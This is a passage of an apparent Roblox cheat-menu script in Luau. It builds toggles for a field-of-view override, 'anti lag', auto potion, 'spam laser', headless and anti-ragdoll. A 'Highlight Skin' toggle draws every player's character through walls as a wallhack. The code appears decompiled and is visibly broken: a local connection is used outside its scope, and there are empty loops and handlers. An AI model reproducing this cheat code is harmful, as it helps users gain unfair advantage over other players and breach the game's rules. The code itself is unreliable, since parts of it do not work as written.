UICorner46.CornerRadius = UDim.new(1, 0)
local TextButton19 = Instance.new("TextButton", Frame34)
TextButton19.Size = UDim2.new(1, 0, 1, 0)
TextButton19.BackgroundTransparency = 1
TextButton19.Text = ""
TextButton19.ZIndex = 19

TextButton19.MouseButton1Click:Connect(function()
	fovConn:Disconnect()

	local connection2 = RunService.RenderStepped:Connect(function(deltaTime6)
		workspace.CurrentCamera.FieldOfView = 80
	end)

	local tween23 = TweenService:Create(Frame34, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween23:Play()
	local tween24 = TweenService:Create(Frame35, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween24:Play()
end)

TextBox4.FocusLost:Connect(function(enterPressed4, inputObject4)
	connection2:Disconnect()

	RunService.RenderStepped:Connect(function(deltaTime7)
		workspace.CurrentCamera.FieldOfView = 80
	end)
end)

local Frame36 = Instance.new("Frame", ScrollingFrame)
Frame36.Size = UDim2.new(1, -10, 0, 56)
Frame36.Position = UDim2.new(0, 3, 0, 430)
Frame36.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame36.BorderSizePixel = 0
Frame36.ZIndex = 16
local UICorner47 = Instance.new("UICorner", Frame36)
UICorner47.CornerRadius = UDim.new(0, 10)
Frame36:GetChildren()
local UIGradient21 = Instance.new("UIGradient")
UIGradient21.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient21.Rotation = 110
UIGradient21.Parent = Frame36
local UIStroke35 = Instance.new("UIStroke", Frame36)
UIStroke35.Color = Color3.fromRGB(100, 35, 35)
UIStroke35.Thickness = 1.2
local TextLabel18 = Instance.new("TextLabel", Frame36)
TextLabel18.Size = UDim2.new(0, 140, 0, 20)
TextLabel18.Position = UDim2.new(0, 8, 0, 4)
TextLabel18.BackgroundTransparency = 1
TextLabel18.Text = "INSTA REST"
TextLabel18.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel18.Font = Enum.Font.GothamBold
TextLabel18.TextSize = 12
TextLabel18.TextXAlignment = Enum.TextXAlignment.Left
TextLabel18.ZIndex = 17
local Frame37 = Instance.new("Frame", Frame36)
Frame37.Size = UDim2.new(0, 36, 0, 18)
Frame37.Position = UDim2.new(1, -46, 0, 5)
Frame37.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame37.BorderSizePixel = 0
Frame37.ZIndex = 17
local UICorner48 = Instance.new("UICorner", Frame37)
UICorner48.CornerRadius = UDim.new(1, 0)
local UIStroke36 = Instance.new("UIStroke", Frame37)
UIStroke36.Color = Color3.fromRGB(100, 35, 35)
local Frame38 = Instance.new("Frame", Frame37)
Frame38.Size = UDim2.new(0, 14, 0, 14)
Frame38.Position = UDim2.new(0, 2, 0.5, -7)
Frame38.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame38.BorderSizePixel = 0
Frame38.ZIndex = 18
local UICorner49 = Instance.new("UICorner", Frame38)
UICorner49.CornerRadius = UDim.new(1, 0)
local TextButton20 = Instance.new("TextButton", Frame37)
TextButton20.Size = UDim2.new(1, 0, 1, 0)
TextButton20.BackgroundTransparency = 1
TextButton20.Text = ""
TextButton20.ZIndex = 19
local TextButton21 = Instance.new("TextButton", Frame36)
TextButton21.Size = UDim2.new(0.46, 0, 0, 22)
TextButton21.Position = UDim2.new(0, 8, 0, 28)
TextButton21.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton21.Text = "[ BUTTON ]"
TextButton21.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton21.Font = Enum.Font.GothamBlack
TextButton21.TextSize = 11
TextButton21.ZIndex = 17
local UICorner50 = Instance.new("UICorner", TextButton21)
UICorner50.CornerRadius = UDim.new(0, 6)
local UIStroke37 = Instance.new("UIStroke", TextButton21)
UIStroke37.Color = Color3.fromRGB(100, 35, 35)
local TextButton22 = Instance.new("TextButton", Frame36)
TextButton22.Size = UDim2.new(0.46, 0, 0, 22)
TextButton22.Position = UDim2.new(0.52, 0, 0, 28)
TextButton22.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton22.Text = "[ MANUAL ]"
TextButton22.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton22.Font = Enum.Font.GothamBlack
TextButton22.TextSize = 11
TextButton22.ZIndex = 17
local UICorner51 = Instance.new("UICorner", TextButton22)
UICorner51.CornerRadius = UDim.new(0, 6)
local UIStroke38 = Instance.new("UIStroke", TextButton22)
UIStroke38.Color = Color3.fromRGB(100, 35, 35)
local Frame39 = Instance.new("Frame", ScrollingFrame)
Frame39.Size = UDim2.new(1, -10, 0, 28)
Frame39.Position = UDim2.new(0, 3, 0, 492)
Frame39.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame39.BorderSizePixel = 0
Frame39.ZIndex = 16
local UICorner52 = Instance.new("UICorner", Frame39)
UICorner52.CornerRadius = UDim.new(0, 10)
Frame39:GetChildren()
local UIGradient22 = Instance.new("UIGradient")
UIGradient22.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient22.Rotation = 110
UIGradient22.Parent = Frame39
local UIStroke39 = Instance.new("UIStroke", Frame39)
UIStroke39.Color = Color3.fromRGB(100, 35, 35)
UIStroke39.Thickness = 1.2
local TextLabel19 = Instance.new("TextLabel", Frame39)
TextLabel19.Size = UDim2.new(0, 90, 1, 0)
TextLabel19.Position = UDim2.new(0, 8, 0, 0)
TextLabel19.BackgroundTransparency = 1
TextLabel19.Text = "Anti lag"
TextLabel19.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel19.Font = Enum.Font.GothamBold
TextLabel19.TextSize = 12
TextLabel19.TextXAlignment = Enum.TextXAlignment.Left
TextLabel19.ZIndex = 17
local Frame40 = Instance.new("Frame", Frame39)
Frame40.Size = UDim2.new(0, 36, 0, 18)
Frame40.Position = UDim2.new(1, -46, 0.5, -9)
Frame40.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame40.BorderSizePixel = 0
Frame40.ZIndex = 17
local UICorner53 = Instance.new("UICorner", Frame40)
UICorner53.CornerRadius = UDim.new(1, 0)
local UIStroke40 = Instance.new("UIStroke", Frame40)
UIStroke40.Color = Color3.fromRGB(100, 35, 35)
local Frame41 = Instance.new("Frame", Frame40)
Frame41.Size = UDim2.new(0, 14, 0, 14)
Frame41.Position = UDim2.new(0, 2, 0.5, -7)
Frame41.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame41.BorderSizePixel = 0
Frame41.ZIndex = 18
local UICorner54 = Instance.new("UICorner", Frame41)
UICorner54.CornerRadius = UDim.new(1, 0)
local TextButton23 = Instance.new("TextButton", Frame40)
TextButton23.Size = UDim2.new(1, 0, 1, 0)
TextButton23.BackgroundTransparency = 1
TextButton23.Text = ""
TextButton23.ZIndex = 19

TextButton23.MouseButton1Click:Connect(function()
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 10000000000
	Lighting.Brightness = 1
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	local children7 = Lighting:GetChildren()

	for k, v9 in pairs(children7) do
		v9.Enabled = false
	end

	workspace:GetDescendants()
	CeboCartelPos12.Material = Enum.Material.Plastic
	CeboCartelPos12.Reflectance = 0
	CeboCartelPos12.CastShadow = false
	CeboCartelPos22.Material = Enum.Material.Plastic
	CeboCartelPos22.Reflectance = 0
	CeboCartelPos22.CastShadow = false

	workspace.DescendantAdded:Connect(function(descendant2)
		descendant2:Destroy()
	end)

	local tween25 = TweenService:Create(Frame40, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween25:Play()
	local tween26 = TweenService:Create(Frame41, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween26:Play()
end)

local Frame42 = Instance.new("Frame", ScrollingFrame)
Frame42.Size = UDim2.new(1, -10, 0, 56)
Frame42.Position = UDim2.new(0, 3, 0, 526)
Frame42.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame42.BorderSizePixel = 0
Frame42.ZIndex = 16
local UICorner55 = Instance.new("UICorner", Frame42)
UICorner55.CornerRadius = UDim.new(0, 10)
Frame42:GetChildren()
local UIGradient23 = Instance.new("UIGradient")
UIGradient23.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient23.Rotation = 110
UIGradient23.Parent = Frame42
local UIStroke41 = Instance.new("UIStroke", Frame42)
UIStroke41.Color = Color3.fromRGB(100, 35, 35)
UIStroke41.Thickness = 1.2
local TextLabel20 = Instance.new("TextLabel", Frame42)
TextLabel20.Size = UDim2.new(0, 140, 0, 20)
TextLabel20.Position = UDim2.new(0, 8, 0, 4)
TextLabel20.BackgroundTransparency = 1
TextLabel20.Text = "AUTO POTION"
TextLabel20.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel20.Font = Enum.Font.GothamBold
TextLabel20.TextSize = 12
TextLabel20.TextXAlignment = Enum.TextXAlignment.Left
TextLabel20.ZIndex = 17
local Frame43 = Instance.new("Frame", Frame42)
Frame43.Size = UDim2.new(0, 36, 0, 18)
Frame43.Position = UDim2.new(1, -46, 0, 5)
Frame43.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame43.BorderSizePixel = 0
Frame43.ZIndex = 17
local UICorner56 = Instance.new("UICorner", Frame43)
UICorner56.CornerRadius = UDim.new(1, 0)
local UIStroke42 = Instance.new("UIStroke", Frame43)
UIStroke42.Color = Color3.fromRGB(100, 35, 35)
local Frame44 = Instance.new("Frame", Frame43)
Frame44.Size = UDim2.new(0, 14, 0, 14)
Frame44.Position = UDim2.new(0, 2, 0.5, -7)
Frame44.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame44.BorderSizePixel = 0
Frame44.ZIndex = 18
local UICorner57 = Instance.new("UICorner", Frame44)
UICorner57.CornerRadius = UDim.new(1, 0)
local TextButton24 = Instance.new("TextButton", Frame43)
TextButton24.Size = UDim2.new(1, 0, 1, 0)
TextButton24.BackgroundTransparency = 1
TextButton24.Text = ""
TextButton24.ZIndex = 19
local TextButton25 = Instance.new("TextButton", Frame42)
TextButton25.Size = UDim2.new(0.46, 0, 0, 22)
TextButton25.Position = UDim2.new(0, 8, 0, 28)
TextButton25.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton25.Text = "[ BUTTON ]"
TextButton25.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton25.Font = Enum.Font.GothamBlack
TextButton25.TextSize = 11
TextButton25.ZIndex = 17
local UICorner58 = Instance.new("UICorner", TextButton25)
UICorner58.CornerRadius = UDim.new(0, 6)
local UIStroke43 = Instance.new("UIStroke", TextButton25)
UIStroke43.Color = Color3.fromRGB(100, 35, 35)
local TextButton26 = Instance.new("TextButton", Frame42)
TextButton26.Size = UDim2.new(0.46, 0, 0, 22)
TextButton26.Position = UDim2.new(0.52, 0, 0, 28)
TextButton26.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton26.Text = "[ MANUAL ]"
TextButton26.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton26.Font = Enum.Font.GothamBlack
TextButton26.TextSize = 11
TextButton26.ZIndex = 17
local UICorner59 = Instance.new("UICorner", TextButton26)
UICorner59.CornerRadius = UDim.new(0, 6)
local UIStroke44 = Instance.new("UIStroke", TextButton26)
UIStroke44.Color = Color3.fromRGB(100, 35, 35)
local Frame45 = Instance.new("Frame", ScrollingFrame)
Frame45.Size = UDim2.new(1, -10, 0, 28)
Frame45.Position = UDim2.new(0, 3, 0, 588)
Frame45.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame45.BorderSizePixel = 0
Frame45.ZIndex = 16
local UICorner60 = Instance.new("UICorner", Frame45)
UICorner60.CornerRadius = UDim.new(0, 10)
Frame45:GetChildren()
local UIGradient24 = Instance.new("UIGradient")
UIGradient24.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient24.Rotation = 110
UIGradient24.Parent = Frame45
local UIStroke45 = Instance.new("UIStroke", Frame45)
UIStroke45.Color = Color3.fromRGB(100, 35, 35)
UIStroke45.Thickness = 1.2
local TextLabel21 = Instance.new("TextLabel", Frame45)
TextLabel21.Size = UDim2.new(0, 110, 1, 0)
TextLabel21.Position = UDim2.new(0, 8, 0, 0)
TextLabel21.BackgroundTransparency = 1
TextLabel21.Text = "Highlight Skin"
TextLabel21.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel21.Font = Enum.Font.GothamBold
TextLabel21.TextSize = 12
TextLabel21.TextXAlignment = Enum.TextXAlignment.Left
TextLabel21.ZIndex = 17
local Frame46 = Instance.new("Frame", Frame45)
Frame46.Size = UDim2.new(0, 36, 0, 18)
Frame46.Position = UDim2.new(1, -46, 0.5, -9)
Frame46.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame46.BorderSizePixel = 0
Frame46.ZIndex = 17
local UICorner61 = Instance.new("UICorner", Frame46)
UICorner61.CornerRadius = UDim.new(1, 0)
local UIStroke46 = Instance.new("UIStroke", Frame46)
UIStroke46.Color = Color3.fromRGB(100, 35, 35)
local Frame47 = Instance.new("Frame", Frame46)
Frame47.Size = UDim2.new(0, 14, 0, 14)
Frame47.Position = UDim2.new(0, 2, 0.5, -7)
Frame47.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame47.BorderSizePixel = 0
Frame47.ZIndex = 18
local UICorner62 = Instance.new("UICorner", Frame47)
UICorner62.CornerRadius = UDim.new(1, 0)
local TextButton27 = Instance.new("TextButton", Frame46)
TextButton27.Size = UDim2.new(1, 0, 1, 0)
TextButton27.BackgroundTransparency = 1
TextButton27.Text = ""
TextButton27.ZIndex = 19

TextButton27.MouseButton1Click:Connect(function()
	local tween27 = TweenService:Create(Frame46, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween27:Play()
	local tween28 = TweenService:Create(Frame47, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween28:Play()
	local players2 = Players:GetPlayers()

	for i9, v10 in ipairs(players2) do
		local CeboHighlight = Instance.new("Highlight")
		CeboHighlight.Name = "CeboHighlight"
		CeboHighlight.FillColor = Color3.fromRGB(231, 76, 76)
		CeboHighlight.OutlineColor = Color3.fromRGB(255, 180, 180)
		CeboHighlight.FillTransparency = 0.55
		CeboHighlight.OutlineTransparency = 0
		CeboHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		CeboHighlight.Enabled = true
		CeboHighlight.Parent = v10.Character
	end
end)

local Frame48 = Instance.new("Frame", ScrollingFrame)
Frame48.Size = UDim2.new(1, -10, 0, 56)
Frame48.Position = UDim2.new(0, 3, 0, 622)
Frame48.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame48.BorderSizePixel = 0
Frame48.ZIndex = 16
local UICorner63 = Instance.new("UICorner", Frame48)
UICorner63.CornerRadius = UDim.new(0, 10)
Frame48:GetChildren()
local UIGradient25 = Instance.new("UIGradient")
UIGradient25.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient25.Rotation = 110
UIGradient25.Parent = Frame48
local UIStroke47 = Instance.new("UIStroke", Frame48)
UIStroke47.Color = Color3.fromRGB(100, 35, 35)
UIStroke47.Thickness = 1.2
local TextLabel22 = Instance.new("TextLabel", Frame48)
TextLabel22.Size = UDim2.new(0, 140, 0, 20)
TextLabel22.Position = UDim2.new(0, 8, 0, 4)
TextLabel22.BackgroundTransparency = 1
TextLabel22.Text = "DROP"
TextLabel22.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel22.Font = Enum.Font.GothamBold
TextLabel22.TextSize = 12
TextLabel22.TextXAlignment = Enum.TextXAlignment.Left
TextLabel22.ZIndex = 17
local Frame49 = Instance.new("Frame", Frame48)
Frame49.Size = UDim2.new(0, 36, 0, 18)
Frame49.Position = UDim2.new(1, -46, 0, 5)
Frame49.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame49.BorderSizePixel = 0
Frame49.ZIndex = 17
local UICorner64 = Instance.new("UICorner", Frame49)
UICorner64.CornerRadius = UDim.new(1, 0)
local UIStroke48 = Instance.new("UIStroke", Frame49)
UIStroke48.Color = Color3.fromRGB(100, 35, 35)
local Frame50 = Instance.new("Frame", Frame49)
Frame50.Size = UDim2.new(0, 14, 0, 14)
Frame50.Position = UDim2.new(0, 2, 0.5, -7)
Frame50.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame50.BorderSizePixel = 0
Frame50.ZIndex = 18
local UICorner65 = Instance.new("UICorner", Frame50)
UICorner65.CornerRadius = UDim.new(1, 0)
local TextButton28 = Instance.new("TextButton", Frame49)
TextButton28.Size = UDim2.new(1, 0, 1, 0)
TextButton28.BackgroundTransparency = 1
TextButton28.Text = ""
TextButton28.ZIndex = 19
local TextButton29 = Instance.new("TextButton", Frame48)
TextButton29.Size = UDim2.new(0.46, 0, 0, 22)
TextButton29.Position = UDim2.new(0, 8, 0, 28)
TextButton29.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton29.Text = "[ BUTTON ]"
TextButton29.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton29.Font = Enum.Font.GothamBlack
TextButton29.TextSize = 11
TextButton29.ZIndex = 17
local UICorner66 = Instance.new("UICorner", TextButton29)
UICorner66.CornerRadius = UDim.new(0, 6)
local UIStroke49 = Instance.new("UIStroke", TextButton29)
UIStroke49.Color = Color3.fromRGB(100, 35, 35)
local TextButton30 = Instance.new("TextButton", Frame48)
TextButton30.Size = UDim2.new(0.46, 0, 0, 22)
TextButton30.Position = UDim2.new(0.52, 0, 0, 28)
TextButton30.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton30.Text = "[ MANUAL ]"
TextButton30.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton30.Font = Enum.Font.GothamBlack
TextButton30.TextSize = 11
TextButton30.ZIndex = 17
local UICorner67 = Instance.new("UICorner", TextButton30)
UICorner67.CornerRadius = UDim.new(0, 6)
local UIStroke50 = Instance.new("UIStroke", TextButton30)
UIStroke50.Color = Color3.fromRGB(100, 35, 35)
local Frame51 = Instance.new("Frame", ScrollingFrame)
Frame51.Size = UDim2.new(1, -10, 0, 28)
Frame51.Position = UDim2.new(0, 3, 0, 684)
Frame51.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame51.BorderSizePixel = 0
Frame51.ZIndex = 16
local UICorner68 = Instance.new("UICorner", Frame51)
UICorner68.CornerRadius = UDim.new(0, 10)
Frame51:GetChildren()
local UIGradient26 = Instance.new("UIGradient")
UIGradient26.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient26.Rotation = 110
UIGradient26.Parent = Frame51
local UIStroke51 = Instance.new("UIStroke", Frame51)
UIStroke51.Color = Color3.fromRGB(100, 35, 35)
UIStroke51.Thickness = 1.2
local TextLabel23 = Instance.new("TextLabel", Frame51)
TextLabel23.Size = UDim2.new(0, 90, 1, 0)
TextLabel23.Position = UDim2.new(0, 8, 0, 0)
TextLabel23.BackgroundTransparency = 1
TextLabel23.Text = "Headless"
TextLabel23.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel23.Font = Enum.Font.GothamBold
TextLabel23.TextSize = 12
TextLabel23.TextXAlignment = Enum.TextXAlignment.Left
TextLabel23.ZIndex = 17
local Frame52 = Instance.new("Frame", Frame51)
Frame52.Size = UDim2.new(0, 36, 0, 18)
Frame52.Position = UDim2.new(1, -46, 0.5, -9)
Frame52.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame52.BorderSizePixel = 0
Frame52.ZIndex = 17
local UICorner69 = Instance.new("UICorner", Frame52)
UICorner69.CornerRadius = UDim.new(1, 0)
local UIStroke52 = Instance.new("UIStroke", Frame52)
UIStroke52.Color = Color3.fromRGB(100, 35, 35)
local Frame53 = Instance.new("Frame", Frame52)
Frame53.Size = UDim2.new(0, 14, 0, 14)
Frame53.Position = UDim2.new(0, 2, 0.5, -7)
Frame53.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame53.BorderSizePixel = 0
Frame53.ZIndex = 18
local UICorner70 = Instance.new("UICorner", Frame53)
UICorner70.CornerRadius = UDim.new(1, 0)
local TextButton31 = Instance.new("TextButton", Frame52)
TextButton31.Size = UDim2.new(1, 0, 1, 0)
TextButton31.BackgroundTransparency = 1
TextButton31.Text = ""
TextButton31.ZIndex = 19

TextButton31.MouseButton1Click:Connect(function()
	local tween29 = TweenService:Create(Frame52, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween29:Play()
	local tween30 = TweenService:Create(Frame53, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween30:Play()
	local Head2 = Players.LocalPlayer.Character:FindFirstChild("Head")
	Head2.Transparency = 1
	Head2.CanCollide = false
	local children8 = Head2:GetChildren()

	for i10, v11 in ipairs(children8) do
		v11:Destroy()
	end

	local children9 = Head2:GetChildren()

	for i11, v12 in ipairs(children9) do
	end

	local HeadlessMesh = Instance.new("SpecialMesh")
	HeadlessMesh.MeshType = Enum.MeshType.FileMesh
	HeadlessMesh.MeshId = "rbxassetid://1095708"
	HeadlessMesh.Scale = Vector3.new(0.0010000000474974513, 0.0010000000474974513, 0.0010000000474974513)
	HeadlessMesh.Name = "HeadlessMesh"
	HeadlessMesh.Parent = Head2
	local changedSignal = Head2:GetPropertyChangedSignal("Transparency")

	changedSignal:Connect(function()
	end)

	Head2.ChildAdded:Connect(function(child12)
	end)

	Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
end)

local Frame54 = Instance.new("Frame", ScrollingFrame)
Frame54.Size = UDim2.new(1, -10, 0, 56)
Frame54.Position = UDim2.new(0, 3, 0, 718)
Frame54.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame54.BorderSizePixel = 0
Frame54.ZIndex = 16
local UICorner71 = Instance.new("UICorner", Frame54)
UICorner71.CornerRadius = UDim.new(0, 10)
Frame54:GetChildren()
local UIGradient27 = Instance.new("UIGradient")
UIGradient27.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient27.Rotation = 110
UIGradient27.Parent = Frame54
local UIStroke53 = Instance.new("UIStroke", Frame54)
UIStroke53.Color = Color3.fromRGB(100, 35, 35)
UIStroke53.Thickness = 1.2
local TextLabel24 = Instance.new("TextLabel", Frame54)
TextLabel24.Size = UDim2.new(0, 140, 0, 20)
TextLabel24.Position = UDim2.new(0, 8, 0, 4)
TextLabel24.BackgroundTransparency = 1
TextLabel24.Text = "SPAM LASER"
TextLabel24.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel24.Font = Enum.Font.GothamBold
TextLabel24.TextSize = 12
TextLabel24.TextXAlignment = Enum.TextXAlignment.Left
TextLabel24.ZIndex = 17
local Frame55 = Instance.new("Frame", Frame54)
Frame55.Size = UDim2.new(0, 36, 0, 18)
Frame55.Position = UDim2.new(1, -46, 0, 5)
Frame55.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame55.BorderSizePixel = 0
Frame55.ZIndex = 17
local UICorner72 = Instance.new("UICorner", Frame55)
UICorner72.CornerRadius = UDim.new(1, 0)
local UIStroke54 = Instance.new("UIStroke", Frame55)
UIStroke54.Color = Color3.fromRGB(100, 35, 35)
local Frame56 = Instance.new("Frame", Frame55)
Frame56.Size = UDim2.new(0, 14, 0, 14)
Frame56.Position = UDim2.new(0, 2, 0.5, -7)
Frame56.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame56.BorderSizePixel = 0
Frame56.ZIndex = 18
local UICorner73 = Instance.new("UICorner", Frame56)
UICorner73.CornerRadius = UDim.new(1, 0)
local TextButton32 = Instance.new("TextButton", Frame55)
TextButton32.Size = UDim2.new(1, 0, 1, 0)
TextButton32.BackgroundTransparency = 1
TextButton32.Text = ""
TextButton32.ZIndex = 19
local TextButton33 = Instance.new("TextButton", Frame54)
TextButton33.Size = UDim2.new(0.46, 0, 0, 22)
TextButton33.Position = UDim2.new(0, 8, 0, 28)
TextButton33.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton33.Text = "[ BUTTON ]"
TextButton33.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton33.Font = Enum.Font.GothamBlack
TextButton33.TextSize = 11
TextButton33.ZIndex = 17
local UICorner74 = Instance.new("UICorner", TextButton33)
UICorner74.CornerRadius = UDim.new(0, 6)
local UIStroke55 = Instance.new("UIStroke", TextButton33)
UIStroke55.Color = Color3.fromRGB(100, 35, 35)
local TextButton34 = Instance.new("TextButton", Frame54)
TextButton34.Size = UDim2.new(0.46, 0, 0, 22)
TextButton34.Position = UDim2.new(0.52, 0, 0, 28)
TextButton34.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton34.Text = "[ MANUAL ]"
TextButton34.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton34.Font = Enum.Font.GothamBlack
TextButton34.TextSize = 11
TextButton34.ZIndex = 17
local UICorner75 = Instance.new("UICorner", TextButton34)
UICorner75.CornerRadius = UDim.new(0, 6)
local UIStroke56 = Instance.new("UIStroke", TextButton34)
UIStroke56.Color = Color3.fromRGB(100, 35, 35)
local Frame57 = Instance.new("Frame", ScrollingFrame)
Frame57.Size = UDim2.new(1, -10, 0, 28)
Frame57.Position = UDim2.new(0, 3, 0, 780)
Frame57.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame57.BorderSizePixel = 0
Frame57.ZIndex = 16
local UICorner76 = Instance.new("UICorner", Frame57)
UICorner76.CornerRadius = UDim.new(0, 10)
Frame57:GetChildren()
local UIGradient28 = Instance.new("UIGradient")
UIGradient28.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient28.Rotation = 110
UIGradient28.Parent = Frame57
local UIStroke57 = Instance.new("UIStroke", Frame57)
UIStroke57.Color = Color3.fromRGB(100, 35, 35)
UIStroke57.Thickness = 1.2
local TextLabel25 = Instance.new("TextLabel", Frame57)
TextLabel25.Size = UDim2.new(0, 120, 1, 0)
TextLabel25.Position = UDim2.new(0, 8, 0, 0)
TextLabel25.BackgroundTransparency = 1
TextLabel25.Text = "Anti Ragdoll"
TextLabel25.TextColor3 = Color3.fromRGB(212, 184, 184)
TextLabel25.Font = Enum.Font.GothamBold
TextLabel25.TextSize = 12
TextLabel25.TextXAlignment = Enum.TextXAlignment.Left
TextLabel25.ZIndex = 17
local Frame58 = Instance.new("Frame", Frame57)
Frame58.Size = UDim2.new(0, 36, 0, 18)
Frame58.Position = UDim2.new(1, -46, 0.5, -9)
Frame58.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame58.BorderSizePixel = 0
Frame58.ZIndex = 17
local UICorner77 = Instance.new("UICorner", Frame58)
UICorner77.CornerRadius = UDim.new(1, 0)
local UIStroke58 = Instance.new("UIStroke", Frame58)
UIStroke58.Color = Color3.fromRGB(100, 35, 35)
local Frame59 = Instance.new("Frame", Frame58)
Frame59.Size = UDim2.new(0, 14, 0, 14)
Frame59.Position = UDim2.new(0, 2, 0.5, -7)
Frame59.BackgroundColor3 = Color3.fromRGB(179, 59, 59)
Frame59.BorderSizePixel = 0
Frame59.ZIndex = 18
local UICorner78 = Instance.new("UICorner", Frame59)
UICorner78.CornerRadius = UDim.new(1, 0)
local TextButton35 = Instance.new("TextButton", Frame58)
TextButton35.Size = UDim2.new(1, 0, 1, 0)
TextButton35.BackgroundTransparency = 1
TextButton35.Text = ""
TextButton35.ZIndex = 19

TextButton35.MouseButton1Click:Connect(function()
	St.antiRagdoll = true
	AntiRagdollV2.Enabled = false
	AntiRagdollV2.Connection:Disconnect()
	AntiRagdollV2.Connection = nil
	AntiRagdollV2.ResetCooldown = 0
